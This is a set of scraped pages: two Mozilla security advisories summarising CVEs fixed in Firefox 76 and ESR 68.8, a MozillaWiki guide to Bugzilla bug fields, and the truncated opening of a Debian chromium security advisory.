    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2020-16

## Security Vulnerabilities fixed in Firefox 76

Announced
May 5, 2020
Impact
critical
Products
Firefox
Fixed in

* Firefox 76

#### [#CVE-2020-12387: Use-after-free during worker shutdown](#CVE-2020-12387)

Reporter
Looben Yang
Impact
critical
##### Description

A race condition when running shutdown code for Web Worker led to a use-after-free vulnerability. This resulted in a potentially exploitable crash.

##### References

* [Bug 1545345](https://bugzilla.mozilla.org/show_bug.cgi?id=1545345)

#### [#CVE-2020-12388: Sandbox escape with improperly guarded Access Tokens](#CVE-2020-12388)

Reporter
James Forshaw of Google Project Zero
Impact
critical
##### Description

The Firefox content processes did not sufficiently lockdown access control which could result in a sandbox escape.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1618911](https://bugzilla.mozilla.org/show_bug.cgi?id=1618911)

#### [#CVE-2020-12389: Sandbox escape with improperly separated process types](#CVE-2020-12389)

Reporter
Niklas Baumstark
Impact
high
##### Description

The Firefox content processes did not sufficiently lockdown access control which could result in a sandbox escape.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1554110](https://bugzilla.mozilla.org/show_bug.cgi?id=1554110)

#### [#CVE-2020-6831: Buffer overflow in SCTP chunk input validation](#CVE-2020-6831)

Reporter
Natalie Silvanovich of Google Project Zero
Impact
high
##### Description

A buffer overflow could occur when parsing and validating SCTP chunks in WebRTC. This could have led to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1632241](https://bugzilla.mozilla.org/show_bug.cgi?id=1632241)

#### [#CVE-2020-12390: Incorrect serialization of nsIPrincipal.origin for IPv6 addresses](#CVE-2020-12390)

Reporter
Giorgio Maone
Impact
moderate
##### Description

Incorrect origin serialization of URLs with IPv6 addresses could lead to incorrect security checks

##### References

* [Bug 1141959](https://bugzilla.mozilla.org/show_bug.cgi?id=1141959)

#### [#CVE-2020-12391: Content-Security-Policy bypass using object elements](#CVE-2020-12391)

Reporter
Giorgio Maone
Impact
moderate
##### Description

Documents formed using `data:` URLs in an `object` element failed to inherit the CSP of the creating context. This allowed the execution of scripts that should have been blocked, albeit with a unique opaque origin.

##### References

* [Bug 1457100](https://bugzilla.mozilla.org/show_bug.cgi?id=1457100)

#### [#CVE-2020-12392: Arbitrary local file access with 'Copy as cURL'](#CVE-2020-12392)

Reporter
Ophir LOJKINE
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP POST data of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in the disclosure of local files.

##### References

* [Bug 1614468](https://bugzilla.mozilla.org/show_bug.cgi?id=1614468)

#### [#CVE-2020-12393: Devtools' 'Copy as cURL' feature did not fully escape website-controlled data, potentially leading to command injection](#CVE-2020-12393)

Reporter
David Yesland
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP method of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in command injection and arbitrary command execution.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1615471](https://bugzilla.mozilla.org/show_bug.cgi?id=1615471)

#### [#CVE-2020-12394: URL spoofing in location bar when unfocussed](#CVE-2020-12394)

Reporter
Kestrel
Impact
low
##### Description

A logic flaw in our location bar implementation could have allowed a local attacker to spoof the current location by selecting a different origin and removing focus from the input element.

##### References

* [Bug 1628288](https://bugzilla.mozilla.org/show_bug.cgi?id=1628288)

#### [#CVE-2020-12395: Memory safety bugs fixed in Firefox 76 and Firefox ESR 68.8](#CVE-2020-12395)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Alexandru Michis, Jason Kratzer, philipp, Ted Campbell, Bas Schouten, André Bargull, and Karl Tomlinson reported memory safety bugs present in Firefox 75 and Firefox ESR 68.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 76 and Firefox ESR 68.8](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1595886%2C1611482%2C1614704%2C1624098%2C1625749%2C1626382%2C1628076%2C1631508)

#### [#CVE-2020-12396: Memory safety bugs fixed in Firefox 76](#CVE-2020-12396)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers and community members Frederik Braun, Andrew McCreight, C.M.Chang, and Dan Minor reported memory safety bugs present in Firefox 75. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 76](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1339601%2C1611938%2C1620488%2C1622291%2C1627644)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from www.mozilla.org_a00a6259_20250119_122049.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2020-17

## Security Vulnerabilities fixed in Firefox ESR 68.8

Announced
May 5, 2020
Impact
critical
Products
Firefox ESR
Fixed in

* Firefox ESR 68.8

#### [#CVE-2020-12387: Use-after-free during worker shutdown](#CVE-2020-12387)

Reporter
Looben Yang
Impact
critical
##### Description

A race condition when running shutdown code for Web Worker led to a use-after-free vulnerability. This resulted in a potentially exploitable crash.

##### References

* [Bug 1545345](https://bugzilla.mozilla.org/show_bug.cgi?id=1545345)

#### [#CVE-2020-12388: Sandbox escape with improperly guarded Access Tokens](#CVE-2020-12388)

Reporter
James Forshaw of Google Project Zero
Impact
critical
##### Description

The Firefox content processes did not sufficiently lockdown access control which could result in a sandbox escape.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1618911](https://bugzilla.mozilla.org/show_bug.cgi?id=1618911)

#### [#CVE-2020-12389: Sandbox escape with improperly separated process types](#CVE-2020-12389)

Reporter
Niklas Baumstark
Impact
high
##### Description

The Firefox content processes did not sufficiently lockdown access control which could result in a sandbox escape.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1554110](https://bugzilla.mozilla.org/show_bug.cgi?id=1554110)

#### [#CVE-2020-6831: Buffer overflow in SCTP chunk input validation](#CVE-2020-6831)

Reporter
Natalie Silvanovich of Google Project Zero
Impact
high
##### Description

A buffer overflow could occur when parsing and validating SCTP chunks in WebRTC. This could have led to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1632241](https://bugzilla.mozilla.org/show_bug.cgi?id=1632241)

#### [#CVE-2020-12392: Arbitrary local file access with 'Copy as cURL'](#CVE-2020-12392)

Reporter
Ophir LOJKINE
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP POST data of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in the disclosure of local files.

##### References

* [Bug 1614468](https://bugzilla.mozilla.org/show_bug.cgi?id=1614468)

#### [#CVE-2020-12393: Devtools' 'Copy as cURL' feature did not fully escape website-controlled data, potentially leading to command injection](#CVE-2020-12393)

Reporter
David Yesland
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP method of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in command injection and arbitrary command execution.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1615471](https://bugzilla.mozilla.org/show_bug.cgi?id=1615471)

#### [#CVE-2020-12395: Memory safety bugs fixed in Firefox 76 and Firefox ESR 68.8](#CVE-2020-12395)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Alexandru Michis, Jason Kratzer, philipp, Ted Campbell, Bas Schouten, André Bargull, and Karl Tomlinson reported memory safety bugs present in Firefox 75 and Firefox ESR 68.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 76 and Firefox ESR 68.8](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1595886%2C1611482%2C1614704%2C1624098%2C1625749%2C1626382%2C1628076%2C1631508)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from wiki.mozilla.org_73f8d6fa_20250119_135947.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from www.debian.org_da2cb9cd_20250119_122048.html ===


---

[[Date Prev](msg00117.html)][[Date Next](msg00119.html)]
[[Thread Prev](msg00117.html)][[Thread Next](msg00119.html)]
[[Date Index](maillist.html#00118)]
[[Thread Index](threads.html#00118)]

# [SECURITY] [DSA 4714-1] chromium security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 4714-1] chromium security update
* *From*: Michael Gilbert <mgilbert@debian.org>
* *Date*: Wed, 1 Jul 2020 21:58:01 -0400
* *Message-id*: <[[🔎]](/msgid-search/CANTw%3DMPu5doGArRhYQyuF8uphwk62KhHO9GMM2pUGW62-Qzy_g%40mail.gmail.com) [CANTw=MPu5doGArRhYQyuF8uphwk62KhHO9GMM2pUGW62-Qzy\_g@mail.gmail.com](msg00118.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-4714-1                   security@debian.org
<https://www.debian.org/security/>                          Michael Gilbert
July 01, 2020                         <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : chromium
CVE ID         : CVE-2020-6423 CVE-2020-6430 CVE-2020-6431 CVE-2020-6432
                 CVE-2020-6433 CVE-2020-6434 CVE-2020-6435 CVE-2020-6436
